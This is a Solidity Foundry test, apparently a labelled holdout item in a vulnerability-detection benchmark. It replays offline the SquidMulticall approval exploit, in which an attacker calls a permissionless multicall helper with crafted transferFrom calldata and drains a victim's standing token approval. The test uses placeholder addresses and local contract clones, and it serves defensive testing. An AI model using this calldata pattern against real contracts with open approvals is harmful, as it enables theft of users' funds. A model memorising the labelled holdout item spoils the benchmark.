// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {
    MiniToken,
    Call,
    SquidMulticallClone
} from "../fixtures/malicious-calldata/b-incident/SquidMulticallClone.sol";

/// @title malicious-calldata (b) real-incident HOLDOUT: SquidMulticall approval exploit (2026-04-07).
/// @notice Minimized OFFLINE replay (no live RPC) of the documented class: a victim approved the
///         permissionless SquidMulticall helper; anyone calls run() with a crafted
///         transferFrom(victim, attacker, amount) and the helper (the approved spender) drains the
///         victim. The verdict is derived from the real outcome (the victim's approved balance
///         leaves it), not hardcoded. CLASS-LEVEL: attacker/victim are explicit placeholders; the
///         specific on-chain tx is not reproduced (see PROVENANCE.md). HOLDOUT (label=vuln).
contract SquidMulticallIncidentTest is Test {
    // Explicit placeholders - the real on-chain identifiers were not authoritatively confirmed.
    address constant ATTACKER = address(0xBAD);
    address constant VICTIM = address(0xBEEF);
    uint256 constant BALANCE = 1 ether; // the Decurity BSC leg moved 1 WETH; representative

    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[malicious-calldata] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_squidMulticallIncident_isDrained() public {
        MiniToken token = new MiniToken();
        SquidMulticallClone multicall = new SquidMulticallClone();

        token.mint(VICTIM, BALANCE);
        // Victim granted the helper a standing approval (the documented precondition).
        vm.prank(VICTIM);
        token.approve(address(multicall), type(uint256).max);

        // Anyone calls the permissionless run() with a crafted transferFrom pulling the victim's
        // balance; the helper is the approved spender, so it succeeds.
        Call[] memory calls = new Call[](1);
        calls[0] = Call({
            target: address(token),
            callData: abi.encodeWithSelector(MiniToken.transferFrom.selector, VICTIM, ATTACKER, BALANCE)
        });
        vm.prank(ATTACKER);
        multicall.run(calls);

        bool drained = token.balanceOf(ATTACKER) == BALANCE && token.balanceOf(VICTIM) == 0;
        _report("squid-multicall-victim", drained);

        assertTrue(drained, "permissionless run() should spend the victim's standing approval");
        assertEq(token.balanceOf(ATTACKER), BALANCE, "attacker received the victim's balance");
    }
}
